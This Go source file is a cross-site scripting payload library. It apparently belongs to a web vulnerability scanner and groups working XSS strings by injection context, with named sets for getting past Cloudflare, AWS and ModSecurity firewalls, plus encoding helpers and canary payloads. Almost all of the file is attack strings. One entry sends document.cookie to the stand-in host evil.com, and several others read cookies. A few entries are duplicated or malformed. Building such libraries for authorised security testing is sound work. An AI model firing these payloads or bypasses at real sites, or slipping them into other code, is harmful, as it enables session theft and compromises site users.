package payloads

import (
	"encoding/base64"
	"fmt"
	"net/url"
	"strings"
)

// Context represents where the payload will be injected
type Context string

const (
	ContextHTML      Context = "html"       // Inside HTML body
	ContextAttr      Context = "attr"       // Inside HTML attribute
	ContextJS        Context = "js"         // Inside JavaScript string
	ContextURL       Context = "url"        // Inside URL parameter
	ContextCSS       Context = "css"        // Inside CSS
	ContextJSVar     Context = "jsvar"      // JavaScript variable assignment
	ContextTemplate  Context = "template"   // Template literal
)

// Payload represents a test payload with metadata
type Payload struct {
	Value    string
	Context  Context
	Tag      string   // Tags: "basic", "img", "svg", "event", "encode", "waf-bypass"
	WAF      string   // Target WAF: "generic", "cloudflare", "aws", "modsec", ""
	Encoding string   // Encoding: "none", "url", "html-entity", "unicode", "base64"
}

// GetBasePayloads returns core XSS payloads organized by context
func GetBasePayloads() []Payload {
	var payloads []Payload

	// === HTML Context ===
	htmlPayloads := []string{
		// Basic tags
		`<script>alert(1)</script>`,
		`<script>alert('XSS')</script>`,
		`<script>confirm(1)</script>`,
		`<script>prompt(1)</script>`,

		// Img tags
		`<img src=x onerror=alert(1)>`,
		`<img src=x onerror="alert(1)">`,
		`<img src=x onerror=confirm(1)>`,
		`<img/src=x onerror=alert(1)>`,
		`<img src=x onerror=alert(1)//`,

		// SVG
		`<svg onload=alert(1)>`,
		`<svg/onload=alert(1)>`,
		`<svg onload=alert(1)//`,
		`<svg><script>alert(1)</script></svg>`,
		`<svg/onload=alert(document.cookie)>`,

		// Event handlers
		`<body onload=alert(1)>`,
		`<input onfocus=alert(1) autofocus>`,
		`<input onfocus=alert(1) autofocus/>`,
		`<marquee onstart=alert(1)>`,
		`<details open ontoggle=alert(1)>`,
		`<video><source onerror=alert(1)>`,
		`<audio src=x onerror=alert(1)>`,
		`<iframe src="javascript:alert(1)">`,
		`<object data="javascript:alert(1)">`,
		`<embed src="javascript:alert(1)">`,

		// Anchor
		`<a href="javascript:alert(1)">click</a>`,
		`<a href="javascript:void(0)" onclick=alert(1)>click</a>`,
		`<a href=javascript&colon;alert(1)>click</a>`,

		// Table
		`<table background="javascript:alert(1)">`,
		`<td background="javascript:alert(1)">`,

		// Form
		`<form><button formaction=javascript:alert(1)>click</button></form>`,
		`<input type=image src=x onerror=alert(1)>`,

		// Meta
		`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,

		// Link
		`<link rel=import href="data:text/html,<script>alert(1)</script>">`,
	}

	for _, p := range htmlPayloads {
		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: categorizeTag(p)})
	}

	// === Attribute Context ===
	attrPayloads := []string{
		`" onmouseover="alert(1)`,
		`' onmouseover='alert(1)`,
		`" onfocus="alert(1)" autofocus="`,
		`" onclick="alert(1)`,
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		`"><img src=x onerror=alert(1)>`,
		`'><img src=x onerror=alert(1)>`,
		`"><svg/onload=alert(1)>`,
		`" onmouseover=alert(1) "`,
		`javascript:alert(1)`,
		`data:text/html,<script>alert(1)</script>`,
		`"><details open ontoggle=alert(1)>`,
	}

	for _, p := range attrPayloads {
		payloads = append(payloads, Payload{Value: p, Context: ContextAttr, Tag: categorizeTag(p)})
	}

	// === JavaScript String Context ===
	jsPayloads := []string{
		`'-alert(1)-'`,
		`"-alert(1)-"`,
		`';alert(1)//`,
		`";alert(1)//`,
		`\';alert(1)//`,
		`\";alert(1)//`,
		`</script><script>alert(1)</script>`,
		`'-alert(document.cookie)-'`,
		`</script><img src=x onerror=alert(1)>`,
		`'-confirm(1)-'`,
		`"+alert(1)+"`,
		`'-prompt(1)-'`,
		`;alert(1)`,
	}

	for _, p := range jsPayloads {
		payloads = append(payloads, Payload{Value: p, Context: ContextJS, Tag: categorizeTag(p)})
	}

	// === URL Parameter Context ===
	urlPayloads := []string{
		`javascript:alert(1)`,
		`javascript:alert(document.cookie)`,
		`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,
		`javascript:void(0);alert(1)`,
		`jaVasCript:alert(1)`,
		`javascript:alert(1)//`,
		`javascript:%61%6c%65%72%74%28%31%29`,
	}

	for _, p := range urlPayloads {
		payloads = append(payloads, Payload{Value: p, Context: ContextURL, Tag: categorizeTag(p)})
	}

	// === Template Literal Context ===
	templatePayloads := []string{
		`${alert(1)}`,
		`${confirm(1)}`,
		`${prompt(1)}`,
		`${document.cookie}`,
		`${alert(document.domain)}`,
		`constructor.constructor("alert(1)")()`,
	}

	for _, p := range templatePayloads {
		payloads = append(payloads, Payload{Value: p, Context: ContextTemplate, Tag: "template"})
	}

	return payloads
}

func categorizeTag(p string) string {
	lower := strings.ToLower(p)
	switch {
	case strings.Contains(lower, "<script"):
		return "script"
	case strings.Contains(lower, "<img"):
		return "img"
	case strings.Contains(lower, "<svg"):
		return "svg"
	case strings.Contains(lower, "onload") || strings.Contains(lower, "onerror") ||
		strings.Contains(lower, "onfocus") || strings.Contains(lower, "onclick") ||
		strings.Contains(lower, "onmouseover") || strings.Contains(lower, "ontoggle"):
		return "event"
	case strings.Contains(lower, "javascript:"):
		return "js-protocol"
	case strings.Contains(lower, "alert") || strings.Contains(lower, "confirm") || strings.Contains(lower, "prompt"):
		return "basic"
	default:
		return "other"
	}
}

// GetWAFBypassPayloads returns payloads designed to bypass common WAFs
func GetWafBypassPayloads() []Payload {
	var payloads []Payload

	// === Cloudflare Bypass ===
	cloudflare := []string{
		// Case manipulation
		`<ScRiPt>alert(1)</ScRiPt>`,
		`<IMG SRC=x ONERROR=alert(1)>`,
		`<sVg OnLoAd=alert(1)>`,

		// Tag mutation
		`<img/src=x/onerror=alert(1)>`,
		`<img src=x onerror=alert(1)//`,
		`<img src=x onerror=alert(1)>`,
		`<svg/onload=alert(1)>`,
		`<svg onload=alert(1)//`,

		// Whitespace tricks
		`<img src=x onerror	=alert(1)>`,
		`<img src=x onerror =	alert(1)>`,
		`<svg onload =alert(1)>`,

		// Quote tricks
		`<img src=x onerror="alert(1)">`,
		`<img src=x onerror='alert(1)'>`,
		`<img src=x onerror=` + "`" + `alert(1)` + "`" + `>`,

		// Null byte
		`<img src=x onerror=alert\x00(1)>`,

		// Double encoding
		`%253Cscript%253Ealert(1)%253C/script%253E`,

		// Using eval
		`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,
		`<svg onload=eval(atob('YWxlcnQoMSk='))>`,

		// alert bypass with function constructor
		`<img src=x onerror=Function("al"+"ert(1)")()>`,
		`<svg onload=Function("al"+"ert(1)")()>`,
		`<img src=x onerror=window["al"+"ert"](1)>`,
		`<svg onload=top["al"+"ert"](1)>`,

		// Unicode tricks
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,

		// Hex encoding
		`<img src=x onerror=\x61lert(1)>`,

		// Using setTimeout/setInterval
		`<img src=x onerror=setTimeout("alert(1)")>`,
		`<svg onload=setTimeout("alert(1)")>`,

		// DOM clobbering
		`<form id=alert><output name=0>1</output></form><input formaction=alert(0)>`,
	}

	for _, p := range cloudflare {
		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "waf-bypass", WAF: "cloudflare"})
	}

	// === AWS WAF Bypass ===
	aws := []string{
		`<img src=x onerror=alert&lpar;1&rpar;>`,
		`<svg onload=alert&#40;1&#41;>`,
		`<img src=x onerror=alert&#x28;1&#x29;>`,
		`<details open ontoggle=alert(1)>`,
		`<marquee onstart=alert(1)>`,
		`<video><source onerror=alert(1)>`,
		`<audio src=x onerror=alert(1)>`,
		`<xss id=alert(1)><xss>`,
		`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`,
		`<img src=x onerror=alert.call(null,1)>`,
		`<svg onload=alert.call(null,1)>`,
	}

	for _, p := range aws {
		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "waf-bypass", WAF: "aws"})
	}

	// === ModSecurity Bypass ===
	modsec := []string{
		`<img src=x onerror=alert(1)>`,
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,
		`<iframe src="javascript:alert(1)">`,
		`<img src=x onerror=window.location='http://evil.com/?c='+document.cookie>`,
		`<svg/onload=alert(1)>`,
		`<img src=x onerror=alert&#40;1&#41;>`,
		`<img src=x onerror=alert(1)//`,
		`<img/src=x/onerror=alert(1)>`,
		`<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>`,
		`<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>`,
	}

	for _, p := range modsec {
		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "waf-bypass", WAF: "modsec"})
	}

	// === Generic WAF Bypass (works against multiple WAFs) ===
	generic := []string{
		// Encoding tricks
		`<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>`,
		`<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>`,

		// Tab/newline injection
		"<img src=x onerror=alert\t(1)>",
		"<img src=x onerror=alert\n(1)>",
		"<img src=x onerror=alert\r(1)>",

		// Mixed case with encoding
		`<sVg/OnLoAd=%61%6c%65%72%74(1)>`,

		// Using top/self/window
		`<img src=x ontop=topalert(1)>`,
		`<img src=x onerror=self.alert(1)>`,
		`<img src=x onerror=top.alert(1)>`,
		`<img src=x onerror=window.alert(1)>`,
		`<img src=x onerror=globalThis.alert(1)>`,

		// Template literal in eval
		`<img src=x onerror=eval.call(0,'alert(1)')()>`,

		// Using import
		`<script>import('data:text/javascript,alert(1)')</script>`,

		// SVG animate
		`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
		`<svg><set onbegin=alert(1) attributename=x to=1>`,
	}

	for _, p := range generic {
		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "waf-bypass", WAF: "generic"})
	}

	return payloads
}

// GetCanaryPayloads returns payloads with a canary for detection
func GetCanaryPayloads(canary string) []Payload {
	payloads := []Payload{
		{Value: canary, Context: ContextHTML, Tag: "canary"},
		{Value: fmt.Sprintf(`<img src=x onerror="window.xssTriggered=true">%s`, canary), Context: ContextHTML, Tag: "canary"},
		{Value: fmt.Sprintf(`"><script>window.xssTriggered=true</script>%s`, canary), Context: ContextAttr, Tag: "canary"},
		{Value: fmt.Sprintf(`"><svg/onload=window.xssTriggered=true>%s`, canary), Context: ContextAttr, Tag: "canary"},
		{Value: fmt.Sprintf(`'-window.xssTriggered=true-'%s`, canary), Context: ContextJS, Tag: "canary"},
		{Value: fmt.Sprintf(`${window.xssTriggered=true}%s`, canary), Context: ContextTemplate, Tag: "canary"},
	}
	return payloads
}

// EncodeURL encodes a payload for URL context
func EncodeURL(payload string) string {
	return url.QueryEscape(payload)
}

// EncodeHTMLEntity encodes a payload using HTML entities
func EncodeHTMLEntity(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		result.WriteString(fmt.Sprintf("&#%d;", r))
	}
	return result.String()
}

// EncodeUnicode encodes a payload using Unicode escapes
func EncodeUnicode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		if r < 128 {
			result.WriteRune(r)
		} else {
			result.WriteString(fmt.Sprintf("\\u%04x", r))
		}
	}
	return result.String()
}

// EncodeBase64 encodes a payload in base64
func EncodeBase64(payload string) string {
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

// GenerateVariants creates encoding variants of a payload
func GenerateVariants(p Payload) []Payload {
	variants := []Payload{p}

	// URL encoded
	variants = append(variants, Payload{
		Value:    EncodeURL(p.Value),
		Context:  p.Context,
		Tag:      p.Tag,
		WAF:      p.WAF,
		Encoding: "url",
	})

	// HTML entity encoded
	variants = append(variants, Payload{
		Value:    EncodeHTMLEntity(p.Value),
		Context:  p.Context,
		Tag:      p.Tag,
		WAF:      p.WAF,
		Encoding: "html-entity",
	})

	return variants
}

// GetAllPayloads returns the complete payload library
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, GetBasePayloads()...)
	all = append(all, GetWafBypassPayloads()...)
	return all
}

// GetPayloadsByContext returns payloads filtered by context
func GetPayloadsByContext(ctx Context) []Payload {
	var filtered []Payload
	for _, p := range GetAllPayloads() {
		if p.Context == ctx {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// GetPayloadsByWAF returns payloads filtered by target WAF
func GetPayloadsByWAF(waf string) []Payload {
	var filtered []Payload
	for _, p := range GetWafBypassPayloads() {
		if p.WAF == waf || p.WAF == "generic" {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// Count returns total payload count
func Count() int {
	return len(GetAllPayloads())
}
